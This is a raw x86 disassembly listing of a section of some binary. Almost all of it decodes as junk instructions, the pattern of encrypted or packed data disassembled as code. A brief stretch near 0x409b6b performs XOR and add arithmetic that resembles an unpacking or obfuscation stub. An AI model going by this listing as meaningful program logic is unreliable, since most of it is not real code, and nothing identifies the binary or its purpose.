  409a09:	or     bh,BYTE PTR gs:[eax-0x5]
  409a0d:	test   eax,0xb0475b39
  409a12:	shr    BYTE PTR [esi-0x764c9d72],cl
  409a18:	and    bh,BYTE PTR [edi+0x57]
  409a1b:	or     DWORD PTR [ebp+0x65d1f7a2],0x50468dcd
  409a25:	mov    edx,0x9616b028
  409a2a:	pop    ebp
  409a2b:	add    ecx,DWORD PTR [ebp+0x74]
  409a2e:	push   esi
  409a2f:	xchg   edx,eax
  409a30:	test   DWORD PTR [edx],0xbfadea38
  409a36:	cwde   
  409a37:	cmp    al,BYTE PTR [ebx-0x2c]
  409a3a:	aam    0x7d
  409a3c:	das    
  409a3d:	xor    eax,edx
  409a3f:	xor    eax,0x9d9cfc2a
  409a44:	nop
  409a45:	repnz (bad) 
  409a48:	cmp    dl,BYTE PTR [ecx]
  409a4a:	cli    
  409a4b:	shl    DWORD PTR [ebx+0x2b449b38],1
  409a51:	add    BYTE PTR [edx+0x5a],dl
  409a54:	and    DWORD PTR [ecx-0x1ae0f371],edx
  409a5a:	jp     0x409a7b
  409a5c:	scas   al,BYTE PTR es:[edi]
  409a5d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a5f:	and    bh,BYTE PTR [ecx+edx*4+0x1e]
  409a63:	ss push ds
  409a65:	cmp    al,0x17
  409a67:	das    
  409a68:	ja     0x409aa6
  409a6a:	xchg   edi,eax
  409a6b:	mul    bh
  409a6d:	jo     0x409a41
  409a6f:	stos   BYTE PTR es:[edi],al
  409a70:	leave  
  409a71:	int    0x6
  409a73:	enter  0xe4bc,0x2f
  409a77:	pop    eax
  409a78:	pop    edx
  409a79:	push   ebx
  409a7a:	aam    0x7b
  409a7c:	int    0x3c
  409a7e:	xchg   ecx,eax
  409a7f:	retf   
  409a80:	push   ebx
  409a81:	test   BYTE PTR [ecx],dh
  409a83:	fst    DWORD PTR [edx]
  409a85:	xor    DWORD PTR [edx+0x16],eax
  409a88:	xchg   ebx,eax
  409a89:	xchg   BYTE PTR ds:0x7a7bc3bd,dh
  409a8f:	aad    0x66
  409a91:	xor    DWORD PTR [esi-0x325d2b4a],0x9
  409a98:	sbb    BYTE PTR [ebp+0x30],0x3d
  409a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a9d:	imul   eax,ebx,0xa687e74f
  409aa3:	xor    ecx,0x18
  409aa6:	push   edi
  409aa7:	imul   esi,DWORD PTR [ecx],0xffffffc5
  409aaa:	mov    al,ds:0x5e7101a
  409aaf:	fimul  DWORD PTR [ebx+0x188eb73e]
  409ab5:	cmp    eax,0x5ffa1ab2
  409aba:	(bad)  
  409abb:	fstp   st(7)
  409abd:	jnp    0x409a9e
  409abf:	dec    edx
  409ac0:	lea    esp,[edx]
  409ac2:	ds dec edi
  409ac4:	in     al,0x56
  409ac6:	adc    DWORD PTR [eax+0x2c],ebx
  409ac9:	cmc    
  409aca:	icebp  
  409acb:	pushf  
  409acc:	push   0x5c3f9758
  409ad1:	jne    0x409adb
  409ad3:	and    bl,0x41
  409ad6:	test   al,0xc8
  409ad8:	aaa    
  409ad9:	scas   al,BYTE PTR es:[edi]
  409ada:	fistp  DWORD PTR [ecx]
  409adc:	sbb    eax,0x9ffc7070
  409ae1:	enter  0xa61,0x20
  409ae5:	jns    0x409b05
  409ae7:	dec    edx
  409ae8:	pop    ebp
  409ae9:	test   edx,ebp
  409aeb:	pushf  
  409aec:	dec    ebp
  409aed:	sub    BYTE PTR [esi],dl
  409aef:	imul   ecx,DWORD PTR [ebp+0x26acccca],0x57
  409af6:	mov    al,ds:0x50dd9e46
  409afb:	popf   
  409afc:	dec    ecx
  409afd:	rcr    ch,0x66
  409b00:	push   0x66a12f4e
  409b05:	adc    DWORD PTR [ecx+0x21],ebp
  409b08:	mov    ecx,0x72cc0fea
  409b0d:	pop    es
  409b0e:	push   ss
  409b0f:	sub    al,0xce
  409b11:	aaa    
  409b12:	fmulp  st(3),st
  409b14:	inc    edx
  409b15:	or     DWORD PTR [esi+0x7c5a4c44],esi
  409b1b:	or     ch,BYTE PTR [edx-0x31]
  409b1e:	mov    ebx,ss
  409b20:	or     DWORD PTR [eax+eiz*2+0x6],edx
  409b24:	sub    bh,BYTE PTR [edi]
  409b26:	push   edi
  409b27:	int    0x69
  409b29:	mov    bh,BYTE PTR [edi-0x495f25d7]
  409b2f:	and    DWORD PTR [edi+eiz*1-0x60],ebp
  409b33:	scas   eax,DWORD PTR es:[edi]
  409b34:	jns    0x409b87
  409b36:	xor    dh,dh
  409b38:	ins    BYTE PTR es:[edi],dx
  409b39:	push   ebp
  409b3a:	int    0xa2
  409b3c:	sti    
  409b3d:	outs   dx,DWORD PTR ds:[esi]
  409b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b3f:	cmc    
  409b40:	mov    WORD PTR [ebp+0x9],fs
  409b43:	pop    ds
  409b44:	aam    0xf
  409b46:	cmp    eax,0x528a923c
  409b4b:	xlat   BYTE PTR ds:[ebx]
  409b4c:	xchg   BYTE PTR [edx],bl
  409b4e:	cmp    cl,BYTE PTR ss:[ebx+ecx*1+0x48]
  409b53:	cmp    BYTE PTR [esi-0x6656edaa],dl
  409b59:	icebp  
  409b5a:	push   eax
  409b5b:	pop    esp
  409b5c:	sbb    BYTE PTR [edx-0x5aad798f],0xa2
  409b63:	hlt    
  409b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b65:	sub    al,0x81
  409b67:	mov    al,0x96
  409b69:	mov    bl,0xdf
  409b6b:	mov    DWORD PTR [ebp-0x40],eax
  409b6e:	sub    DWORD PTR ds:0x434683,edx
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x4345df
  409b7f:	or     DWORD PTR ds:0x43464f,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x43467f
  409b8f:	xor    DWORD PTR ds:0x434683,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x43466b
  409bb7:	mov    edi,DWORD PTR ds:0x434723
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	cmp    ecx,ecx
  409bd5:	pop    edx
  409bd6:	stos   BYTE PTR es:[edi],al
  409bd7:	mov    gs,edx
  409bd9:	jle    0x409c59
  409bdb:	jo     0x409c56
  409bdd:	jle    0x409c5d
  409bdf:	cs (bad) 
  409be1:	xor    eax,0x3b033785
  409be6:	dec    ecx
  409be7:	(bad)  
  409be8:	pop    ds
  409be9:	leave  
  409bea:	mov    esi,0x1dac6141
  409bef:	dec    edi
  409bf0:	push   ecx
  409bf1:	gs in  eax,dx
  409bf3:	cmp    dh,bh
  409bf5:	and    al,0xa7
  409bf7:	dec    edx
  409bf8:	lods   al,BYTE PTR ds:[esi]
  409bf9:	or     eax,0x3bbf21ab
  409bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bff:	push   edi
  409c00:	xchg   esi,eax
  409c01:	loop   0x409c74
  409c03:	out    dx,al
  409c04:	rol    bl,1
  409c06:	mov    eax,ds:0x40b115da
  409c0b:	(bad)  
  409c0c:	in     al,dx
  409c0d:	push   ss
  409c0e:	and    eax,0xb6a4ed4c
  409c13:	xchg   esp,eax
  409c14:	aad    0x6f
  409c16:	cmp    esi,DWORD PTR [ecx-0x727e8ed5]
  409c1c:	in     eax,0x95
  409c1e:	jl     0x409be1
  409c20:	mov    eax,ds:0x1838d454
  409c25:	xchg   esp,eax
  409c26:	ror    BYTE PTR [eax-0x67],1
  409c29:	jns    0x409c60
  409c2b:	fsubrp st(5),st
  409c2e:	in     al,dx
  409c2f:	sub    al,0x16
  409c31:	je     0x409c42
  409c33:	icebp  
  409c34:	adc    al,0xed
  409c36:	add    esp,0xffffff9b
  409c39:	push   cs
  409c3a:	je     0x409bbe
  409c3c:	dec    edi
  409c3d:	gs scas al,BYTE PTR es:[edi]
  409c3f:	jns    0x409c91
  409c41:	in     al,dx
  409c42:	std    
  409c43:	or     BYTE PTR [ebx-0x36],bl
  409c46:	mul    edx
  409c48:	dec    esp
  409c49:	ret    
  409c4a:	jle    0x409c13
  409c4c:	cs ins BYTE PTR es:[edi],dx
  409c4e:	dec    edx
  409c4f:	call   0x733e:0x92a4d74
  409c56:	push   0x7c
  409c58:	jg     0x409c3c
  409c5a:	ss mov esi,0x4d61c838
  409c60:	out    0x7e,al
  409c62:	ins    DWORD PTR es:[edi],dx
  409c63:	out    dx,eax
  409c64:	cmp    al,0x56
  409c66:	dec    edx
  409c67:	push   eax
  409c68:	repnz into 
  409c6a:	push   edx
  409c6b:	cdq    
  409c6c:	ins    BYTE PTR es:[edi],dx
  409c6d:	hlt    
  409c6e:	data16 stc 
  409c70:	ror    BYTE PTR [ebp-0x32],1
  409c73:	out    0xa,al
  409c75:	call   DWORD PTR [ebx]
  409c77:	pop    ss
  409c78:	js     0x409c89
  409c7a:	(bad)  
  409c7b:	popf   
  409c7c:	cmp    DWORD PTR ds:0x47b1062d,ecx
  409c82:	jno    0x409c16
  409c84:	(bad)  
  409c85:	fcomp  DWORD PTR [edi]
  409c87:	gs popa 
  409c89:	dec    ebx
  409c8a:	push   ds
  409c8b:	sbb    cl,BYTE PTR [eax-0x2531b436]
  409c91:	and    ebp,0x7e
  409c94:	daa    
  409c95:	or     bl,ah
  409c97:	pop    esp
  409c98:	dec    esp
  409c99:	inc    edi
  409c9a:	(bad)  
  409c9b:	call   0x6b28008f
  409ca0:	dec    edx
  409ca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ca2:	std    
  409ca3:	enter  0xb63a,0x8e
  409ca7:	mov    bl,BYTE PTR [ebx-0x3e8dad9b]
  409cad:	ss sbb ah,0x39
  409cb1:	xchg   ebx,eax
  409cb2:	sbb    DWORD PTR [ebx],edx
  409cb4:	pop    edi
  409cb5:	dec    eax
  409cb6:	or     ebx,ebp
  409cb8:	popa   
  409cb9:	stos   DWORD PTR es:[edi],eax
  409cba:	int3   
  409cbb:	in     eax,dx
  409cbc:	push   ds
  409cbd:	mov    eax,ds:0x45631439
  409cc2:	sub    al,0x7
  409cc4:	repz into 
  409cc6:	call   0xd775:0x63c6a460
  409ccd:	inc    ebx
  409cce:	dec    ebx
  409ccf:	data16 outs dx,BYTE PTR ds:[esi]
  409cd1:	ds popf 
  409cd3:	repz ss in eax,0xb4
  409cd7:	xchg   esp,eax
  409cd8:	jne    0x409cf1
  409cda:	stos   BYTE PTR es:[edi],al
  409cdb:	dec    ebx
  409cdc:	cmc    
  409cdd:	sub    ebp,edx
  409cdf:	not    dl
  409ce1:	mov    edx,0x1849d662
  409ce6:	adc    bl,BYTE PTR [eax]
  409ce8:	(bad)  
  409ce9:	in     al,dx
  409cea:	jmp    FWORD PTR [esi-0x60]
  409ced:	inc    ebx
  409cee:	pop    es
  409cef:	out    dx,al
  409cf0:	jae    0x409caf
  409cf2:	fnclex 
  409cf4:	pop    ecx
  409cf5:	mov    bh,BYTE PTR [ebx+0x396c0345]
  409cfb:	outs   dx,BYTE PTR ds:[esi]
  409cfc:	jns    0x409d05
  409cfe:	pop    edi
  409cff:	loop   0x409d10
  409d01:	test   edx,eax
  409d03:	rcr    BYTE PTR [esp+ecx*1+0x3f],0x8
  409d08:	(bad)
  409d0d:	mov    BYTE PTR [ebx+esi*1],bh
  409d10:	xor    dl,BYTE PTR [eiz*2+0x24ed7dc]
  409d17:	lds    esp,FWORD PTR [edi-0x3ebb8866]
  409d1d:	setne  bl
  409d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d21:	scas   eax,DWORD PTR es:[edi]
  409d22:	mov    ebp,0x550b78b2
  409d27:	jg     0x409d99
  409d29:	push   ebp
  409d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d2b:	and    ebx,DWORD PTR [edx+0x2da906b0]
  409d31:	imul   edx,DWORD PTR [edx],0x59743563
  409d37:	loopne 0x409d83
  409d39:	or     al,0x9
  409d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d3c:	(bad)  
  409d3d:	clc    
  409d3e:	test   DWORD PTR ds:0xf550da09,esi
  409d44:	adc    al,0x9f
  409d46:	pusha  
  409d47:	add    esp,DWORD PTR [eax]
  409d49:	jae    0x409db7
  409d4b:	adc    BYTE PTR [ebx],al
  409d4d:	mov    edi,0x32605530
  409d52:	jmp    0x409d3b
  409d54:	repnz sub dh,0xb9
  409d58:	sbb    DWORD PTR [ebx+0x559d3023],edx
  409d5e:	and    BYTE PTR [ebp-0x208adc7],bh
  409d64:	loop   0x409d2a
  409d66:	es xchg al,bh
  409d69:	or     al,0x49
  409d6b:	push   esp
  409d6c:	jbe    0x409d34
  409d6e:	int3   
  409d6f:	repz dec eax
  409d71:	cmp    DWORD PTR [edx+0x487fa4f9],edi
  409d77:	(bad)  
  409d78:	daa    
  409d79:	pop    esi
  409d7a:	daa    
  409d7b:	aam    0x88
  409d7d:	js     0x409dcd
  409d7f:	retf   0x3f7e
  409d82:	adc    eax,0x7b3893da
  409d87:	jae    0x409dfe
  409d89:	in     al,dx
  409d8a:	ds mov ecx,0x8ea9cdd1
  409d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d91:	hlt    
  409d92:	cmp    al,0xfe
  409d94:	in     eax,dx
  409d95:	test   DWORD PTR gs:[edi+edi*1],ecx
  409d99:	sub    eax,0x7d57896b
  409d9e:	sbb    al,0xfd
  409da0:	sub    DWORD PTR [edi+0x5b3a418b],ebp
  409da6:	jo     0x409d4a
  409da8:	fist   DWORD PTR [eax]
  409daa:	jmp    0xf12989ee
  409daf:	dec    edx
  409db0:	push   ebx
  409db1:	add    DWORD PTR [edi-0x3d],esp
  409db4:	(bad)  
  409db6:	jmp    0xd7bd41b5
  409dbb:	push   cs
  409dbc:	test   al,0xf9
  409dbe:	dec    ecx
  409dbf:	cld    
  409dc0:	sti    
  409dc1:	and    eax,0xdcd51b3e
  409dc6:	mov    ebx,0xa743d715
  409dcb:	jmp    0x409dac
  409dcd:	data16 sti 
  409dcf:	ds dec eax
  409dd1:	out    0x10,eax
  409dd3:	add    al,ch
  409dd5:	push   es
  409dd6:	test   al,0xa1
  409dd8:	loop   0x409de0
  409dda:	jb     0x409dec
  409ddc:	xchg   ecx,eax
  409ddd:	ins    DWORD PTR es:[edi],dx
  409dde:	jle    0x409dc7
  409de0:	test   al,0x5e
  409de2:	in     eax,dx
  409de3:	fstp   TBYTE PTR [ecx]
  409de5:	push   0x81bc344
  409dea:	and    DWORD PTR [ebx+0x35],esp
  409ded:	fstp   QWORD PTR [ebx]
  409def:	sbb    al,0x5d
  409df1:	add    DWORD PTR [ebx+0xf2006aa],eax
  409df7:	jle    0x409e0d
  409df9:	inc    edx
  409dfa:	and    edx,DWORD PTR [esi]
  409dfc:	pop    esp
  409dfd:	lahf   
  409dfe:	dec    ecx
  409dff:	push   cs
  409e00:	jno    0x409ddb
  409e02:	mov    ecx,esi
  409e04:	cmp    esp,ebp
  409e06:	add    DWORD PTR [ecx],0x1aeda8ba
  409e0c:	popf   
  409e0d:	sbb    DWORD PTR [ecx-0x1cd09043],ebp
  409e13:	in     al,dx
  409e14:	adc    BYTE PTR [esi+0x1ef9591a],ah
  409e1a:	dec    ecx
  409e1b:	sti    
  409e1c:	int    0x19
  409e1e:	adc    al,0x81
  409e20:	popf   
  409e21:	sbb    DWORD PTR [ebp+0x3659f895],0x67
  409e28:	and    esp,DWORD PTR [esi+0x3]
  409e2b:	outs   dx,BYTE PTR ds:[esi]
  409e2c:	ja     0x409e2a
  409e2e:	dec    ecx
  409e2f:	jae    0x409e34
  409e31:	test   al,0xd6
  409e33:	shl    BYTE PTR [edx+0x1b49c0a0],0xff
  409e3a:	or     ecx,DWORD PTR [edx-0x71ffdd10]
  409e40:	scas   al,BYTE PTR es:[edi]
  409e41:	inc    esi
  409e42:	adc    BYTE PTR [edi],0x51
  409e45:	add    esi,edi
  409e47:	pop    edx
  409e48:	outs   dx,BYTE PTR ds:[esi]
  409e49:	ja     0x409e4c
  409e4b:	inc    edi
  409e4c:	adc    DWORD PTR [edi],edi
  409e4e:	call   0x3101:0x6c0fe998
  409e55:	(bad)  
  409e56:	push   ecx
  409e57:	int    0xe
  409e59:	push   es
  409e5a:	ficomp WORD PTR [edi-0x7d]
  409e5d:	push   ebx
  409e5e:	ins    BYTE PTR es:[edi],dx
  409e5f:	retf   0xc577
  409e62:	pop    ebp
  409e63:	mov    edi,0xa726506d
  409e68:	adc    eax,0x41bd93f6
  409e6d:	xlat   BYTE PTR ds:[ebx]
  409e6e:	popa   
  409e6f:	pop    ecx
  409e70:	mov    ebp,0xe538428c
  409e75:	adc    DWORD PTR [ecx],eax
  409e77:	repz add dh,bh
  409e7a:	out    dx,eax
  409e7b:	cmp    eax,0xde2bd770
  409e80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e81:	fnstenv ds:0x915c8c2e
  409e87:	(bad)  
  409e88:	leave  
  409e89:	nop
  409e8a:	(bad)  
  409e8b:	fiadd  WORD PTR [edx-0x3a92188a]
  409e91:	sbb    dh,dl
  409e93:	icebp  
  409e94:	xchg   esp,eax
  409e95:	loopne 0x409e3e
  409e97:	stc    
  409e98:	(bad)  
  409e99:	xor    BYTE PTR [ebx+edi*1-0x3a74b4e0],ch
  409ea0:	adc    DWORD PTR [edi+ecx*4],esp
  409ea3:	sub    eax,0xe9f5802c
  409ea8:	cmp    edx,0xffffffc4
  409eab:	hlt    
  409eac:	cmp    DWORD PTR [ebp+0x3d077e73],eax
  409eb2:	xor    cl,BYTE PTR [esi-0x7e]
  409eb5:	jmp    0x2118:0xa2304912
  409ebc:	ins    DWORD PTR es:[edi],dx
  409ebd:	call   0xabcc61d4
  409ec2:	inc    esi
  409ec3:	push   eax
  409ec4:	push   0x313866db
  409ec9:	fnstcw WORD PTR [esi+0x794ea901]
  409ecf:	jbe    0x409e94
  409ed1:	cbw    
  409ed3:	and    al,0x86
  409ed5:	xchg   edx,eax
  409ed6:	adc    DWORD PTR [esi],edi
  409ed8:	call   0xcd59:0xc429a28e
  409edf:	fucomip st,st(4)
  409ee1:	stos   DWORD PTR es:[edi],eax
  409ee2:	sbb    eax,0xf4c9d9c6
  409ee7:	adc    ecx,edi
  409ee9:	push   esi
  409eea:	and    DWORD PTR [edi+0x7d29949b],ebx
  409ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ef1:	xor    DWORD PTR [edi+0x13bb33b8],ebx
  409ef7:	imul   ecx,DWORD PTR [edi-0x50],0x665bf689
  409efe:	mov    eax,ds:0xa6f705ff
  409f03:	pop    esp
  409f04:	pop    eax
  409f05:	test   DWORD PTR [edx+0x45bfe3bf],edi
  409f0b:	(bad)  
  409f0c:	in     al,dx
  409f0d:	imul   ebp,edx,0x72
  409f10:	rep stos DWORD PTR es:[edi],eax
  409f12:	fdivr  QWORD PTR [eax+0x570020d1]
  409f18:	fmul   QWORD PTR [edx]
  409f1a:	cmp    DWORD PTR [edi+0x1e],esp
  409f1d:	mov    DWORD PTR [eax],eax
  409f1f:	scas   al,BYTE PTR es:[edi]
  409f20:	push   0xffffff99
  409f22:	xor    esp,esi
  409f24:	cmp    eax,0x87251d24
  409f29:	mov    eax,0xc4a9a657
  409f2e:	popf   
  409f2f:	pop    ebx
  409f30:	lods   eax,DWORD PTR ds:[esi]
  409f31:	lods   al,BYTE PTR ds:[esi]
  409f32:	in     eax,0xb4
  409f34:	sub    DWORD PTR [esi],ebx
  409f36:	mov    eax,ds:0xb40fa41d
  409f3b:	jbe    0x409f69
  409f3d:	sbb    esp,eax
  409f3f:	inc    edx
  409f40:	mov    bh,0x2b
  409f42:	popf   
  409f43:	ja     0x409ef1
  409f45:	sbb    DWORD PTR [ecx+ebx*4+0x7],edi
  409f49:	sbb    eax,0x293484b9
  409f4e:	fsubr  QWORD PTR [eax+0x7b]
  409f51:	mov    DWORD PTR ds:0x5e23d02d,esp
  409f57:	sub    al,0x9e
  409f59:	test   BYTE PTR [eax],0xb
  409f5c:	(bad)  
  409f5d:	jmp    0x409fbc
  409f5f:	iret   
  409f60:	stos   BYTE PTR es:[edi],al
  409f61:	add    DWORD PTR [edx-0x1],esp
  409f64:	retf   
  409f65:	and    bh,BYTE PTR [edi]
  409f67:	scas   al,BYTE PTR es:[edi]
  409f68:	fcmovne st,st(4)
  409f6a:	daa    
  409f6b:	std    
  409f6c:	test   BYTE PTR [esi],al
  409f6e:	imul   ecx,DWORD PTR [ebx-0xb968fe6],0xc6314e1b
  409f78:	cmp    BYTE PTR [esi],al
  409f7a:	ins    BYTE PTR es:[edi],dx
  409f7b:	cmp    ch,dh
  409f7d:	sbb    al,0x44
  409f7f:	sub    DWORD PTR [edx],0x8eb34269
  409f85:	and    al,0xf
  409f87:	rcr    DWORD PTR [ebp+0x91f5331],1
  409f8d:	in     eax,dx
  409f8e:	loop   0x409f37
  409f90:	mov    DWORD PTR [esi+0x1e7c21c8],ebp
  409f96:	fmulp  st(5),st
  409f98:	ja     0x40a00e
  409f9a:	inc    ebx
  409f9b:	and    ebx,ebx
  409f9d:	adc    al,0x5d
  409f9f:	xchg   ebp,eax
  409fa0:	das    
  409fa1:	dec    eax
  409fa2:	fucomip st,st(7)
  409fa4:	dec    esp
  409fa5:	call   0x2199:0xdf8368f1
  409fac:	inc    edx
  409fad:	inc    ebx
  409fae:	mov    cl,0xb9
  409fb0:	xchg   esp,eax
  409fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fb2:	enter  0x208a,0x67
  409fb6:	sbb    DWORD PTR [eax+0x3],ebp
  409fb9:	sbb    BYTE PTR [esi-0x55],bh
  409fbc:	in     al,dx
  409fbd:	retf   
  409fbe:	je     0x409ff3
  409fc0:	sahf   
  409fc1:	xchg   esp,eax
  409fc2:	mov    edx,0x5c19b5fb
  409fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fc8:	ins    BYTE PTR es:[edi],dx
  409fc9:	inc    edi
  409fca:	leave  
  409fcb:	push   0x1d
  409fcd:	pop    esp
  409fce:	out    0x17,al
  409fd0:	std    
  409fd1:	sub    BYTE PTR [eax],0x8
  409fd4:	pop    ds
  409fd5:	lds    edx,FWORD PTR [edi+0x45c79ed5]
  409fdb:	fdivr  DWORD PTR [eax]
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fld    DWORD PTR [ebx-0x7f12b7f2]
  409ff8:	idiv   BYTE PTR [esi+0x7e]
  409ffb:	jo     0x40a076
  409ffd:	jle    0x40a07d
  409fff:	pop    ecx
  40a000:	mov    dh,0x4d
  40a002:	aam    0x6e
  40a004:	xor    BYTE PTR [ebp-0x1e],bh
  40a007:	ins    DWORD PTR es:[edi],dx
  40a008:	mov    DWORD PTR [eax+0x7bb964e0],ecx
  40a00e:	sub    ecx,DWORD PTR [edi-0x71]
  40a011:	jl     0x40a050
  40a013:	mov    ss,WORD PTR [edx]
  40a015:	imul   esi,DWORD PTR [edx-0x13],0xffffffa1
  40a019:	dec    esi
  40a01a:	adc    BYTE PTR [edi+edi*2+0x53],cl
  40a01e:	pop    ds
  40a01f:	mov    edi,0x6f8c8223
  40a024:	push   ebp
  40a025:	stos   BYTE PTR es:[edi],al
  40a026:	push   ecx
  40a027:	xchg   ebx,eax
  40a028:	or     ch,BYTE PTR [edi-0x39]
  40a02b:	fsub   st(4),st
  40a02d:	pop    esi
  40a02e:	inc    ecx
  40a02f:	jle    0x409fd7
  40a031:	cmp    eax,0xc13433be
  40a036:	mov    ds,esp
  40a038:	add    al,0xd1
  40a03a:	stos   DWORD PTR es:[edi],eax
  40a03b:	lods   al,BYTE PTR ds:[esi]
  40a03c:	sub    eax,0x38d300e7
  40a041:	inc    esp
  40a042:	daa    
  40a043:	mov    esp,0x6732fe47
  40a048:	ja     0x40a08a
  40a04a:	sahf   
  40a04b:	aam    0x61
  40a04d:	and    BYTE PTR [ebx-0x93ee715],bh
  40a053:	imul   ebp,ebp,0xfffffff7
  40a056:	jne    0x40a02a
  40a058:	daa    
  40a059:	xor    bl,dl
  40a05b:	(bad)  
  40a05c:	or     al,0x21
  40a05e:	and    BYTE PTR es:[edi-0x75824aab],cl
  40a065:	out    0x49,al
  40a067:	mov    ah,0x70
  40a069:	xor    dh,BYTE PTR [eax+0x0]
  40a06c:	fucomi st,st(2)
  40a06e:	loop   0x40a0e7
  40a070:	(bad)  
  40a071:	fwait
  40a072:	push   ebx
  40a073:	ficom  WORD PTR ds:0x736b8e95
  40a079:	loopne 0x40a012
  40a07b:	push   ss
  40a07c:	push   0xc
  40a07e:	dec    edx
  40a07f:	mov    cl,0x1a
  40a081:	push   0x24
  40a083:	out    dx,eax
  40a084:	repnz adc DWORD PTR [edi],esi
  40a087:	push   esp
  40a088:	add    eax,0xe1d0621a
  40a08d:	jl     0x40a0e5
  40a08f:	xor    ch,BYTE PTR ds:0xbf423ad3
  40a095:	add    cl,BYTE PTR [ebp+0x73]
  40a098:	das    
  40a099:	xchg   ebx,eax
  40a09a:	shl    DWORD PTR [eax-0x7cdca534],0xb7
  40a0a1:	(bad)  
  40a0a2:	inc    edx
  40a0a3:	in     eax,dx
  40a0a4:	rcl    DWORD PTR [ebx+0x70139475],1
  40a0aa:	xchg   ebp,eax
  40a0ab:	jne    0x40a0e5
  40a0ad:	adc    eax,0x24b69013
  40a0b2:	mov    eax,0xe4d1390e
  40a0b7:	lods   eax,DWORD PTR ds:[esi]
  40a0b8:	or     BYTE PTR [edi],dh
  40a0ba:	das    
  40a0bb:	retf   0xae63
  40a0be:	fisubr WORD PTR [ebp-0x36da4bca]
  40a0c4:	pop    ebp
  40a0c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0c6:	arpl   WORD PTR [eax],ax
  40a0c8:	cmc    
  40a0c9:	and    ecx,DWORD PTR [eax+0x8]
  40a0cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0cd:	stos   BYTE PTR es:[edi],al
  40a0ce:	cmc    
  40a0cf:	popa   
  40a0d0:	dec    edi
  40a0d1:	sub    eax,0xc4acdc59
  40a0d6:	mov    edi,0xa6862600
  40a0db:	jecxz  0x40a127
  40a0dd:	xchg   BYTE PTR [ebx+0x2f],al
  40a0e0:	lock mov BYTE PTR [ecx],dh
  40a0e3:	xor    ebp,eax
  40a0e5:	jecxz  0x40a0b9
  40a0e7:	fidivr DWORD PTR [ebx+edi*8]
  40a0ea:	mov    ds:0x6b1d822e,al
  40a0ef:	test   DWORD PTR [eax-0x571aae82],edi
  40a0f5:	mov    eax,esi
  40a0f7:	punpckhdq mm3,mm5
  40a0fa:	jb     0x40a10b
  40a0fc:	mov    al,0x45
  40a0fe:	sub    DWORD PTR [ebx+0x13ce8450],eax
  40a104:	jbe    0x40a093
  40a106:	inc    edx
  40a107:	push   esi
  40a108:	je     0x40a17c
  40a10a:	cmp    eax,DWORD PTR [ecx-0x1c3d26be]
  40a110:	xchg   edi,eax
  40a111:	cmp    DWORD PTR [edx-0x72],edi
  40a114:	(bad)  
  40a115:	xor    bh,BYTE PTR [ebx-0x6a8ba5b4]
  40a11b:	sub    BYTE PTR [edx+eiz*2-0xf],0x3
  40a120:	pop    ecx
  40a121:	bnd jae 0x40a0eb
  40a124:	and    eax,0xdf36442e
  40a129:	jb     0x9851b1a2
  40a12f:	mov    dh,BYTE PTR [edi]
  40a131:	ror    DWORD PTR [eax],1
  40a133:	sub    eax,ebp
  40a135:	ss mov bh,ch
  40a138:	pushf  
  40a139:	dec    esi
  40a13a:	in     eax,0xe8
  40a13c:	aaa    
  40a13d:	arpl   si,bp
  40a13f:	or     al,0x8
  40a141:	rcr    esp,1
  40a143:	call   0xdfe1:0xbbaa516e
  40a14a:	int    0x39
  40a14c:	imul   ebp
  40a14e:	rcr    BYTE PTR [edx+0x10],cl
  40a151:	jle    0x40a1c7
  40a153:	cmp    eax,0x5375e4e2
  40a158:	and    BYTE PTR [ebx-0x71587e75],ah
  40a15e:	bound  ecx,QWORD PTR ds:0x7126c17e
  40a164:	repz (bad) [ebx-0x58179854]
  40a16b:	frstor [edi+0x15ce4784]
  40a171:	push   ds
  40a172:	push   0xffffffa1
  40a174:	fmul   st,st(5)
  40a176:	cmp    bl,bl
  40a178:	jmp    0x40a184
  40a17a:	push   es
  40a17b:	fs stc 
  40a17d:	dec    edx
  40a17e:	int3   
  40a17f:	push   es
  40a180:	push   esi
  40a181:	test   eax,0xe422870e
  40a186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a187:	pop    ss
  40a188:	jle    0x40a15b
  40a18a:	scas   eax,DWORD PTR es:[edi]
  40a18b:	mov    bl,0xf7
